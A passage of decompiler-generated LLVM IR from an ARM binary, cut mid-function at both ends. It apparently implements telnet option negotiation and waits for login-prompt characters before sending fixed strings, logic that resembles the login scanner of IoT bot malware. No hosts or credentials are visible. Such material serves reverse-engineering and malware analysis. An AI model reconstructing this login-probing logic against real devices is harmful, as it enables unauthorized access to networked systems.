  %v7_113ec = icmp eq i8 %v3_113dc, 36
  store i1 %v7_113ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113ec, label %dec_label_pc_115dc, label %dec_label_pc_113f4

dec_label_pc_113f4:                               ; preds = %dec_label_pc_113ec
  %v2_113f4 = icmp ugt i8 %v3_113dc, 34
  store i1 %v2_113f4, i1* %cpsr_c.global-to-local, align 1
  %v7_113f4 = icmp eq i8 %v3_113dc, 35
  store i1 %v7_113f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113f4, label %dec_label_pc_115dc, label %dec_label_pc_1142c.preheader

dec_label_pc_1142c.preheader:                     ; preds = %dec_label_pc_113f4
  %v3_113f8 = add i32 %v0_10c9c, 28
  %v2_113fc = add i32 %v3_113f8, %v3_113c8
  store i32 %v2_113fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1142c

dec_label_pc_11408:                               ; preds = %dec_label_pc_1142c
  %v1_11408 = add i32 %v0_11424, -2
  %v2_11408 = inttoptr i32 %v1_11408 to i8*
  %v3_11408 = load i8, i8* %v2_11408, align 1
  %v4_11408 = zext i8 %v3_11408 to i32
  store i32 %v4_11408, i32* %r2.global-to-local, align 4
  %v2_1140c = icmp ugt i8 %v3_11408, 61
  store i1 %v2_1140c, i1* %cpsr_c.global-to-local, align 1
  %v7_1140c = icmp eq i8 %v3_11408, 62
  store i1 %v7_1140c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1140c, label %dec_label_pc_115dc, label %bb369

bb369:                                            ; preds = %dec_label_pc_11408
  %v3_11410 = icmp ugt i8 %v3_11408, 57
  store i1 %v3_11410, i1* %cpsr_c.global-to-local, align 1
  %v8_11410 = icmp eq i8 %v3_11408, 58
  store i1 %v8_11410, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11410, label %dec_label_pc_115dc, label %dec_label_pc_11418

dec_label_pc_11418:                               ; preds = %bb369
  %v2_11418 = icmp ugt i8 %v3_11408, 35
  store i1 %v2_11418, i1* %cpsr_c.global-to-local, align 1
  %v7_11418 = icmp eq i8 %v3_11408, 36
  store i1 %v7_11418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11418, label %dec_label_pc_115dc, label %dec_label_pc_11420

dec_label_pc_11420:                               ; preds = %dec_label_pc_11418
  %v2_11420 = icmp ugt i8 %v3_11408, 34
  store i1 %v2_11420, i1* %cpsr_c.global-to-local, align 1
  %v7_11420 = icmp eq i8 %v3_11408, 35
  store i1 %v7_11420, i1* %cpsr_z.global-to-local, align 1
  %v1_11424 = add i32 %v0_11424, -1
  store i32 %v1_11424, i32* %r3.global-to-local, align 4
  br i1 %v7_11420, label %dec_label_pc_115dc, label %dec_label_pc_1142c

dec_label_pc_1142c:                               ; preds = %dec_label_pc_1142c.preheader, %dec_label_pc_11420
  %v0_11424 = phi i32 [ %v2_113fc, %dec_label_pc_1142c.preheader ], [ %v1_11424, %dec_label_pc_11420 ]
  %v0_1142c = phi i32 [ %v1_113cc, %dec_label_pc_1142c.preheader ], [ %v1_1142c, %dec_label_pc_11420 ]
  %v1_1142c = add i32 %v0_1142c, -1
  store i32 %v1_1142c, i32* %r0.global-to-local, align 4
  %v2_1142c = icmp ne i32 %v0_1142c, 0
  store i1 %v2_1142c, i1* %cpsr_c.global-to-local, align 1
  %v7_1142c = icmp eq i32 %v0_1142c, 1
  store i1 %v7_1142c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1142c, label %dec_label_pc_11434, label %dec_label_pc_11408

dec_label_pc_11434:                               ; preds = %dec_label_pc_1142c, %dec_label_pc_113c8
  %v0_11434 = load i32, i32* @fp, align 4
  store i32 %v0_11434, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19a1c.328 to i32), i32* %r2.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v5_11440 = call i32 @function_123dc(i32 %v0_11434, i32 %v3_113c8, i32 ptrtoint ([8 x i8]* @global_var_19a1c.328 to i32), i32 7)
  store i32 %v5_11440, i32* %r0.global-to-local, align 4
  %v2_11444 = icmp eq i32 %v5_11440, -1
  store i1 %v2_11444, i1* %cpsr_c.global-to-local, align 1
  %v7_11444 = icmp eq i32 %v5_11440, -1
  store i1 %v7_11444, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_11440, i32* @r7, align 4
  br i1 %v7_11444, label %dec_label_pc_10c18.loopexit, label %dec_label_pc_11450

dec_label_pc_11450:                               ; preds = %dec_label_pc_11434
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11450 = icmp eq i32 %v5_11440, 0
  store i1 %v2_11450, i1* %cpsr_z.global-to-local, align 1
  %tmp370 = icmp slt i32 %v5_11440, 1
  br i1 %tmp370, label %dec_label_pc_113bc, label %dec_label_pc_11450.dec_label_pc_115e0_crit_edge

dec_label_pc_11450.dec_label_pc_115e0_crit_edge:  ; preds = %dec_label_pc_11450
  %v0_115e0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_115e0

dec_label_pc_1145c:                               ; preds = %dec_label_pc_10c9c
  %v1_1145c = add i32 %v0_10c9c, 24
  %v2_1145c = inttoptr i32 %v1_1145c to i32*
  %v3_1145c = load i32, i32* %v2_1145c, align 4
  store i32 %v3_1145c, i32* %r2.global-to-local, align 4
  %v0_11460 = load i32, i32* @fp, align 4
  store i32 %v0_11460, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_11468123 = icmp eq i32 %v3_1145c, 0
  store i1 %v9_11468123, i1* %cpsr_z.global-to-local, align 1
  %v7_1146c124 = icmp sgt i32 %v3_1145c, 0
  br i1 %v7_1146c124, label %dec_label_pc_11470.preheader, label %dec_label_pc_1151c

dec_label_pc_11468.loopexit:                      ; preds = %dec_label_pc_1148c
  %v2_11494 = add i32 %v1_11494, 2
  store i32 %v2_11494, i32* @r4, align 4
  %v2_11498 = add i32 %v1_11498, 2
  store i32 %v2_11498, i32* @r7, align 4
  %v3_11468 = icmp uge i32 %v0_11468, %v2_11498
  store i1 %v3_11468, i1* %cpsr_c.global-to-local, align 1
  %v9_11468 = icmp eq i32 %v0_11468, %v2_11498
  store i1 %v9_11468, i1* %cpsr_z.global-to-local, align 1
  %v7_1146c = icmp sgt i32 %v0_11468, %v2_11498
  br i1 %v7_1146c, label %dec_label_pc_11470.preheader, label %dec_label_pc_1151c

dec_label_pc_11470.preheader:                     ; preds = %dec_label_pc_1145c, %dec_label_pc_11468.loopexit
  %v6_11524207 = phi i32 [ %v6_11524208, %dec_label_pc_11468.loopexit ], [ %v0_10c9c, %dec_label_pc_1145c ]
  %v1_11498190 = phi i32 [ %v2_11498, %dec_label_pc_11468.loopexit ], [ 0, %dec_label_pc_1145c ]
  %v1_1147c188 = phi i32 [ %v0_11468, %dec_label_pc_11468.loopexit ], [ %v3_1145c, %dec_label_pc_1145c ]
  %v0_11470186 = phi i32 [ %v2_11494, %dec_label_pc_11468.loopexit ], [ %v0_11460, %dec_label_pc_1145c ]
  br label %dec_label_pc_11470

dec_label_pc_11470:                               ; preds = %dec_label_pc_11470.preheader, %dec_label_pc_11500
  %v6_11524208 = phi i32 [ %v6_11524207, %dec_label_pc_11470.preheader ], [ %v0_11508, %dec_label_pc_11500 ]
  %v1_11498 = phi i32 [ %v1_11498190, %dec_label_pc_11470.preheader ], [ %v1_1150c, %dec_label_pc_11500 ]
  %v0_11468 = phi i32 [ %v1_1147c188, %dec_label_pc_11470.preheader ], [ %v3_11508, %dec_label_pc_11500 ]
  %v1_11494 = phi i32 [ %v0_11470186, %dec_label_pc_11470.preheader ], [ %v1_11514, %dec_label_pc_11500 ]
  %v1_11470 = inttoptr i32 %v1_11494 to i8*
  %v2_11470 = load i8, i8* %v1_11470, align 1
  %v3_11470 = zext i8 %v2_11470 to i32
  store i32 %v3_11470, i32* %r3.global-to-local, align 4
  %v2_11474 = icmp eq i8 %v2_11470, -1
  store i1 %v2_11474, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_11474, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11474, label %dec_label_pc_1147c, label %dec_label_pc_1151c

dec_label_pc_1147c:                               ; preds = %dec_label_pc_11470
  %v0_1147c = load i32, i32* @fp, align 4
  %v2_1147c = add i32 %v0_1147c, %v0_11468
  store i32 %v2_1147c, i32* %r1.global-to-local, align 4
  %v1_11480 = add i32 %v1_11494, 1
  store i32 %v1_11480, i32* @r5, align 4
  %v3_11484 = icmp uge i32 %v2_1147c, %v1_11480
  store i1 %v3_11484, i1* %cpsr_c.global-to-local, align 1
  %v9_11484 = icmp eq i32 %v2_1147c, %v1_11480
  store i1 %v9_11484, i1* %cpsr_z.global-to-local, align 1
  %v2_11488 = xor i1 %v3_11484, true
  %v3_11488 = or i1 %v9_11484, %v2_11488
  br i1 %v3_11488, label %dec_label_pc_1151c, label %dec_label_pc_1148c

dec_label_pc_1148c:                               ; preds = %dec_label_pc_1147c
  %v2_1148c = inttoptr i32 %v1_11480 to i8*
  %v3_1148c = load i8, i8* %v2_1148c, align 1
  %v4_1148c = zext i8 %v3_1148c to i32
  store i32 %v4_1148c, i32* @r3, align 4
  %v2_11490 = icmp eq i8 %v3_1148c, -1
  store i1 %v2_11490, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_11490, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11490, label %dec_label_pc_11468.loopexit, label %dec_label_pc_114a0

dec_label_pc_114a0:                               ; preds = %dec_label_pc_1148c
  %v2_114a0 = icmp ugt i8 %v3_1148c, -4
  store i1 %v2_114a0, i1* %cpsr_c.global-to-local, align 1
  %v7_114a0 = icmp eq i8 %v3_1148c, -3
  store i1 %v7_114a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114a0, label %dec_label_pc_1152c, label %dec_label_pc_114a8

dec_label_pc_114a8:                               ; preds = %dec_label_pc_114a0
  %v1_114a8 = add i32 %v1_11494, 2
  store i32 %v1_114a8, i32* %r3.global-to-local, align 4
  %v3_114ac = icmp uge i32 %v2_1147c, %v1_114a8
  store i1 %v3_114ac, i1* %cpsr_c.global-to-local, align 1
  %v9_114ac = icmp eq i32 %v2_1147c, %v1_114a8
  store i1 %v9_114ac, i1* %cpsr_z.global-to-local, align 1
  %v2_114b0 = xor i1 %v3_114ac, true
  %v3_114b0 = or i1 %v9_114ac, %v2_114b0
  br i1 %v3_114b0, label %dec_label_pc_1151c, label %dec_label_pc_114b4

dec_label_pc_114b4:                               ; preds = %dec_label_pc_11590, %bb375, %.thread97, %dec_label_pc_114a8
  %v0_114b4 = load i32, i32* @r5, align 4
  %v1_114b4 = inttoptr i32 %v0_114b4 to i8*
  %v2_114b4 = load i8, i8* %v1_114b4, align 1
  %v3_114b4 = zext i8 %v2_114b4 to i32
  store i32 %v3_114b4, i32* %r3.global-to-local, align 4
  %v2_114b8 = icmp ugt i8 %v2_114b4, -4
  store i1 %v2_114b8, i1* %cpsr_c.global-to-local, align 1
  %v7_114b8 = icmp eq i8 %v2_114b4, -3
  store i1 %v7_114b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114b8, label %.thread89, label %dec_label_pc_114c8

.thread89:                                        ; preds = %dec_label_pc_114b4
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_114b4, align 1
  %v0_114c4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_114c4.pr.pr, label %.thread92, label %.thread89.dec_label_pc_114c8thread-pre-split_crit_edge

.thread89.dec_label_pc_114c8thread-pre-split_crit_edge: ; preds = %.thread89
  %v0_114c8.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_114c8

dec_label_pc_114c8:                               ; preds = %dec_label_pc_114b4, %.thread89.dec_label_pc_114c8thread-pre-split_crit_edge
  %v0_114c8.pr = phi i32 [ %v0_114c8.pr.pre, %.thread89.dec_label_pc_114c8thread-pre-split_crit_edge ], [ %v3_114b4, %dec_label_pc_114b4 ]
  %v2_114c8 = icmp ugt i32 %v0_114c8.pr, 250
  store i1 %v2_114c8, i1* %cpsr_c.global-to-local, align 1
  %v7_114c8 = icmp eq i32 %v0_114c8.pr, 251
  store i1 %v7_114c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114c8, label %bb371, label %.thread92

bb371:                                            ; preds = %dec_label_pc_114c8
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_114d0 = load i32, i32* @r5, align 4
  %v4_114d0 = inttoptr i32 %v3_114d0 to i8*
  store i8 -3, i8* %v4_114d0, align 1
  br label %.thread92

.thread92:                                        ; preds = %dec_label_pc_114c8, %.thread89, %bb371
  %v0_114d4 = load i32, i32* @r4, align 4
  %v1_114d4 = add i32 %v0_114d4, 2
  %v2_114d4 = inttoptr i32 %v1_114d4 to i8*
  %v3_114d4 = load i8, i8* %v2_114d4, align 1
  %v4_114d4 = zext i8 %v3_114d4 to i32
  store i32 %v4_114d4, i32* %r3.global-to-local, align 4
  %v2_114d8 = icmp ugt i8 %v3_114d4, -4
  store i1 %v2_114d8, i1* %cpsr_c.global-to-local, align 1
  %v7_114d8 = icmp eq i8 %v3_114d4, -3
  store i1 %v7_114d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114d8, label %.thread93, label %dec_label_pc_114e8

.thread93:                                        ; preds = %.thread92
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_114d4, align 1
  %v0_114e4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_114e4.pr.pr, label %.thread96, label %.thread93.dec_label_pc_114e8thread-pre-split_crit_edge

.thread93.dec_label_pc_114e8thread-pre-split_crit_edge: ; preds = %.thread93
  %v0_114e8.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_114e8

dec_label_pc_114e8:                               ; preds = %.thread92, %.thread93.dec_label_pc_114e8thread-pre-split_crit_edge
  %v0_114e8.pr = phi i32 [ %v0_114e8.pr.pre, %.thread93.dec_label_pc_114e8thread-pre-split_crit_edge ], [ %v4_114d4, %.thread92 ]
  %v2_114e8 = icmp ugt i32 %v0_114e8.pr, 250
  store i1 %v2_114e8, i1* %cpsr_c.global-to-local, align 1
  %v7_114e8 = icmp eq i32 %v0_114e8.pr, 251
  store i1 %v7_114e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114e8, label %bb372, label %.thread96

bb372:                                            ; preds = %dec_label_pc_114e8
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_114f0 = load i32, i32* @r4, align 4
  %v4_114f0 = add i32 %v3_114f0, 2
  %v5_114f0 = inttoptr i32 %v4_114f0 to i8*
  store i8 -3, i8* %v5_114f0, align 1
  br label %.thread96

.thread96:                                        ; preds = %dec_label_pc_114e8, %.thread93, %bb372
  %v0_114f4 = load i32, i32* @r6, align 4
  %v1_114f4 = add i32 %v0_114f4, 4
  %v2_114f4 = inttoptr i32 %v1_114f4 to i32*
  %v3_114f4 = load i32, i32* %v2_114f4, align 4
  store i32 %v3_114f4, i32* @r0, align 4
  %v0_114f8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_11500

dec_label_pc_11500:                               ; preds = %dec_label_pc_1173c, %.thread96
  %v0_11504 = phi i32 [ %v3_11750, %dec_label_pc_1173c ], [ %v3_114f4, %.thread96 ]
  %storemerge3 = phi i32 [ %v2_11544, %dec_label_pc_1173c ], [ %v0_114f8, %.thread96 ]
  %storemerge2 = phi i32 [ 9, %dec_label_pc_1173c ], [ 3, %.thread96 ]
  store i32 %storemerge3, i32* @r1, align 4
  store i32 %storemerge2, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11504 = call i32 @function_14a74(i32 %v0_11504, i32 %storemerge3, i32 %storemerge2, i32 16384)
  store i32 %v4_11504, i32* %r0.global-to-local, align 4
  %v0_11508 = load i32, i32* @r6, align 4
  %v1_11508 = add i32 %v0_11508, 24
  %v2_11508 = inttoptr i32 %v1_11508 to i32*
  %v3_11508 = load i32, i32* %v2_11508, align 4
  store i32 %v3_11508, i32* %r2.global-to-local, align 4
  %v0_1150c = load i32, i32* @r7, align 4
  %v1_1150c = add i32 %v0_1150c, 3
  store i32 %v1_1150c, i32* @r7, align 4
  %v3_11510 = icmp uge i32 %v3_11508, %v1_1150c
  store i1 %v3_11510, i1* %cpsr_c.global-to-local, align 1
  %v9_11510 = icmp eq i32 %v3_11508, %v1_1150c
  store i1 %v9_11510, i1* %cpsr_z.global-to-local, align 1
  %v0_11514 = load i32, i32* @r4, align 4
  %v1_11514 = add i32 %v0_11514, 3
  store i32 %v1_11514, i32* @r4, align 4
  %v8_11518 = icmp sgt i32 %v3_11508, %v1_1150c
  br i1 %v8_11518, label %dec_label_pc_11470, label %dec_label_pc_1151c

dec_label_pc_1151c:                               ; preds = %dec_label_pc_11468.loopexit, %dec_label_pc_11470, %dec_label_pc_11500, %dec_label_pc_114a8, %dec_label_pc_1147c, %dec_label_pc_1145c, %dec_label_pc_1152c.dec_label_pc_1151c.loopexit_crit_edge
  %v6_11524 = phi i32 [ %v0_1155c, %dec_label_pc_1152c.dec_label_pc_1151c.loopexit_crit_edge ], [ %v0_10c9c, %dec_label_pc_1145c ], [ %v6_11524208, %dec_label_pc_11470 ], [ %v0_11508, %dec_label_pc_11500 ], [ %v6_11524208, %dec_label_pc_114a8 ], [ %v6_11524208, %dec_label_pc_1147c ], [ %v6_11524208, %dec_label_pc_11468.loopexit ]
  %v0_1151c = phi i32 [ %v0_1151c.pre.pre, %dec_label_pc_1152c.dec_label_pc_1151c.loopexit_crit_edge ], [ 0, %dec_label_pc_1145c ], [ %v1_11498, %dec_label_pc_11470 ], [ %v1_1150c, %dec_label_pc_11500 ], [ %v1_11498, %dec_label_pc_114a8 ], [ %v1_11498, %dec_label_pc_1147c ], [ %v2_11498, %dec_label_pc_11468.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1151c = icmp eq i32 %v0_1151c, 0
  store i1 %v2_1151c, i1* %cpsr_z.global-to-local, align 1
  %tmp373 = icmp slt i32 %v0_1151c, 1
  br i1 %tmp373, label %dec_label_pc_113bc, label %bb374

bb374:                                            ; preds = %dec_label_pc_1151c
  store i32 3, i32* %r0.global-to-local, align 4
  %v7_11524 = add i32 %v6_11524, 12
  %v8_11524 = inttoptr i32 %v7_11524 to i32*
  store i32 3, i32* %v8_11524, align 4
  br label %dec_label_pc_113bc

dec_label_pc_1152c:                               ; preds = %dec_label_pc_114a0
  store i32 %v2_11530, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_19a2d.330 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_11530, i32* %r0.global-to-local, align 4
  store i32 %v2_11544, i32* @sl, align 4
  %v4_11548 = call i32 @function_150f0(i16* %v3_11548, i32 ptrtoint (i32* @global_var_19a2d.330 to i32), i32 3)
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v2_11544, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19a24.332 to i32), i32* %r1.global-to-local, align 4
  %v4_11558 = call i32 @function_150f0(i16* %v3_11558, i32 ptrtoint (i32* @global_var_19a24.332 to i32), i32 9)
  store i32 %v4_11558, i32* %r0.global-to-local, align 4
  %v0_1155c = load i32, i32* @r6, align 4
  %v1_1155c = add i32 %v0_1155c, 24
  %v2_1155c = inttoptr i32 %v1_1155c to i32*
  %v3_1155c = load i32, i32* %v2_1155c, align 4
  %v0_11560 = load i32, i32* @r4, align 4
  %v1_11560 = add i32 %v0_11560, 2
  store i32 %v1_11560, i32* %r2.global-to-local, align 4
  %v0_11564 = load i32, i32* @fp, align 4
  %v2_11564 = add i32 %v0_11564, %v3_1155c
  store i32 %v2_11564, i32* %r3.global-to-local, align 4
  %v3_11568 = icmp uge i32 %v2_11564, %v1_11560
  store i1 %v3_11568, i1* %cpsr_c.global-to-local, align 1
  %v9_11568 = icmp eq i32 %v2_11564, %v1_11560
  store i1 %v9_11568, i1* %cpsr_z.global-to-local, align 1
  %v2_1156c = xor i1 %v3_11568, true
  %v3_1156c = or i1 %v9_11568, %v2_1156c
  br i1 %v3_1156c, label %dec_label_pc_1152c.dec_label_pc_1151c.loopexit_crit_edge, label %dec_label_pc_11570

dec_label_pc_1152c.dec_label_pc_1151c.loopexit_crit_edge: ; preds = %dec_label_pc_1152c
  %v0_1151c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1151c

dec_label_pc_11570:                               ; preds = %dec_label_pc_1152c
  %v2_11570 = inttoptr i32 %v1_11560 to i8*
  %v3_11570 = load i8, i8* %v2_11570, align 1
  %v4_11570 = zext i8 %v3_11570 to i32
  store i32 %v4_11570, i32* %r3.global-to-local, align 4
  %v2_11574 = icmp ugt i8 %v3_11570, 30
  store i1 %v2_11574, i1* %cpsr_c.global-to-local, align 1
  %v7_11574 = icmp eq i8 %v3_11570, 31
  store i1 %v7_11574, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11574, label %dec_label_pc_1173c, label %dec_label_pc_1157c

dec_label_pc_1157c:                               ; preds = %dec_label_pc_11570
  %v1_1157c = inttoptr i32 %v0_11560 to i8*
  %v2_1157c = load i8, i8* %v1_1157c, align 1
  %v3_1157c = zext i8 %v2_1157c to i32
  store i32 %v3_1157c, i32* %r3.global-to-local, align 4
  %v2_11580 = icmp ugt i8 %v2_1157c, -4
  store i1 %v2_11580, i1* %cpsr_c.global-to-local, align 1
  %v7_11580 = icmp eq i8 %v2_1157c, -3
  store i1 %v7_11580, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11580, label %.thread97, label %dec_label_pc_11590

.thread97:                                        ; preds = %dec_label_pc_1157c
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_1157c, align 1
  %v0_1158c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1158c.pr.pr, label %dec_label_pc_114b4, label %.thread97.dec_label_pc_11590thread-pre-split_crit_edge

.thread97.dec_label_pc_11590thread-pre-split_crit_edge: ; preds = %.thread97
  %v0_11590.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11590

dec_label_pc_11590:                               ; preds = %dec_label_pc_1157c, %.thread97.dec_label_pc_11590thread-pre-split_crit_edge
  %v0_11590.pr = phi i32 [ %v0_11590.pr.pre, %.thread97.dec_label_pc_11590thread-pre-split_crit_edge ], [ %v3_1157c, %dec_label_pc_1157c ]
  %v2_11590 = icmp ugt i32 %v0_11590.pr, 250
  store i1 %v2_11590, i1* %cpsr_c.global-to-local, align 1
  %v7_11590 = icmp eq i32 %v0_11590.pr, 251
  store i1 %v7_11590, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11590, label %bb375, label %dec_label_pc_114b4

bb375:                                            ; preds = %dec_label_pc_11590
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_11598 = load i32, i32* @r4, align 4
  %v4_11598 = inttoptr i32 %v3_11598 to i8*
  store i8 -3, i8* %v4_11598, align 1
  br label %dec_label_pc_114b4

dec_label_pc_115a0:                               ; preds = %dec_label_pc_11364, %dec_label_pc_11384, %dec_label_pc_1137c, %dec_label_pc_11374, %bb366, %dec_label_pc_11350, %dec_label_pc_1132c, %dec_label_pc_11348, %dec_label_pc_11340, %bb365
  %v0_115a0 = phi i32 [ %v1_11320, %dec_label_pc_11350 ], [ %v1_11320, %dec_label_pc_1132c ], [ %v1_11320, %dec_label_pc_11348 ], [ %v1_11320, %dec_label_pc_11340 ], [ %v1_11320, %bb365 ], [ %v1_11390, %bb366 ], [ %v1_11390, %dec_label_pc_11374 ], [ %v1_11390, %dec_label_pc_1137c ], [ %v1_11390, %dec_label_pc_11384 ], [ %v1_11390, %dec_label_pc_11364 ]
  %v1_115a0 = add i32 %v0_115a0, 1
  store i32 %v1_115a0, i32* @r7, align 4
  br label %dec_label_pc_115a4

dec_label_pc_115a4:                               ; preds = %dec_label_pc_113b4.dec_label_pc_115a4_crit_edge, %dec_label_pc_115a0
  %v0_115a4 = phi i32 [ %v0_115a4.pre, %dec_label_pc_113b4.dec_label_pc_115a4_crit_edge ], [ %v0_10c9c, %dec_label_pc_115a0 ]
  %v1_115a4 = inttoptr i32 %v0_115a4 to i32*
  %v2_115a4 = load i32, i32* %v1_115a4, align 4
  store i32 %v2_115a4, i32* %r3.global-to-local, align 4
  %v1_115a8 = add i32 %v0_115a4, 4
  %v2_115a8 = inttoptr i32 %v1_115a8 to i32*
  %v3_115a8 = load i32, i32* %v2_115a8, align 4
  store i32 %v3_115a8, i32* @r0, align 4
  %v1_115ac = add i32 %v2_115a4, 12
  %v2_115ac = inttoptr i32 %v1_115ac to i8*
  %v3_115ac = load i8, i8* %v2_115ac, align 1
  %v4_115ac = zext i8 %v3_115ac to i32
  store i32 %v4_115ac, i32* @r2, align 4
  %v1_115b0 = inttoptr i32 %v2_115a4 to i32*
  %v2_115b0 = load i32, i32* %v1_115b0, align 4
  store i32 %v2_115b0, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_115b8 = call i32 @function_14a74(i32 %v3_115a8, i32 %v2_115b0, i32 %v4_115ac, i32 16384)
  store i32 %v4_115b8, i32* %r0.global-to-local, align 4
  %v0_115bc = load i32, i32* @r6, align 4
  %v1_115bc = add i32 %v0_115bc, 4
  %v2_115bc = inttoptr i32 %v1_115bc to i32*
  %v3_115bc = load i32, i32* %v2_115bc, align 4
  store i32 %v3_115bc, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_115cc = call i32 @function_14a74(i32 %v3_115bc, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_115d4 = load i32, i32* @r6, align 4
  %v2_115d4 = add i32 %v1_115d4, 12
  %v3_115d4 = inttoptr i32 %v2_115d4 to i32*
  store i32 4, i32* %v3_115d4, align 4
  br label %dec_label_pc_113bc

dec_label_pc_115dc:                               ; preds = %dec_label_pc_11408, %dec_label_pc_11420, %dec_label_pc_11418, %bb369, %dec_label_pc_113f4, %dec_label_pc_113d8, %dec_label_pc_113ec, %bb368
  %v0_115dc = phi i32 [ %v1_113cc, %dec_label_pc_113f4 ], [ %v1_113cc, %dec_label_pc_113d8 ], [ %v1_113cc, %dec_label_pc_113ec ], [ %v1_113cc, %bb368 ], [ %v1_1142c, %bb369 ], [ %v1_1142c, %dec_label_pc_11418 ], [ %v1_1142c, %dec_label_pc_11420 ], [ %v1_1142c, %dec_label_pc_11408 ]
  %v1_115dc = add i32 %v0_115dc, 1
  store i32 %v1_115dc, i32* @r7, align 4
  br label %dec_label_pc_115e0

dec_label_pc_115e0:                               ; preds = %dec_label_pc_11450.dec_label_pc_115e0_crit_edge, %dec_label_pc_115dc
  %v0_115e0 = phi i32 [ %v0_115e0.pre, %dec_label_pc_11450.dec_label_pc_115e0_crit_edge ], [ %v0_10c9c, %dec_label_pc_115dc ]
  %v1_115e0 = inttoptr i32 %v0_115e0 to i32*
  %v2_115e0 = load i32, i32* %v1_115e0, align 4
  store i32 %v2_115e0, i32* %r3.global-to-local, align 4
  %v1_115e4 = add i32 %v0_115e0, 4
  %v2_115e4 = inttoptr i32 %v1_115e4 to i32*
  %v3_115e4 = load i32, i32* %v2_115e4, align 4
  store i32 %v3_115e4, i32* @r0, align 4
  %v1_115e8 = add i32 %v2_115e0, 13
  %v2_115e8 = inttoptr i32 %v1_115e8 to i8*
  %v3_115e8 = load i8, i8* %v2_115e8, align 1
  %v4_115e8 = zext i8 %v3_115e8 to i32
  store i32 %v4_115e8, i32* @r2, align 4
  %v1_115ec = add i32 %v2_115e0, 4
  %v2_115ec = inttoptr i32 %v1_115ec to i32*
  %v3_115ec = load i32, i32* %v2_115ec, align 4
  store i32 %v3_115ec, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_115f4 = call i32 @function_14a74(i32 %v3_115e4, i32 %v3_115ec, i32 %v4_115e8, i32 16384)
  store i32 %v4_115f4, i32* %r0.global-to-local, align 4
  %v0_115f8 = load i32, i32* @r6, align 4
  %v1_115f8 = add i32 %v0_115f8, 4
  %v2_115f8 = inttoptr i32 %v1_115f8 to i32*
  %v3_115f8 = load i32, i32* %v2_115f8, align 4
  store i32 %v3_115f8, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11608 = call i32 @function_14a74(i32 %v3_115f8, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32 2, i32 16384)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_11610 = load i32, i32* @r6, align 4
  %v2_11610 = add i32 %v1_11610, 12
  %v3_11610 = inttoptr i32 %v2_11610 to i32*
  store i32 5, i32* %v3_11610, align 4
  br label %dec_label_pc_113bc

dec_label_pc_11618:                               ; preds = %dec_label_pc_10d54
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_11624 = call i32 @function_11a94(i32 25)
  store i32 %v2_112d4, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_11634 = call i32 @function_119d0(i32 25, i32* nonnull %stack_var_-60)
  store i32 %v3_11634, i32* %r0.global-to-local, align 4
  %v3_11638 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_11634, i32* %r2.global-to-local, align 4
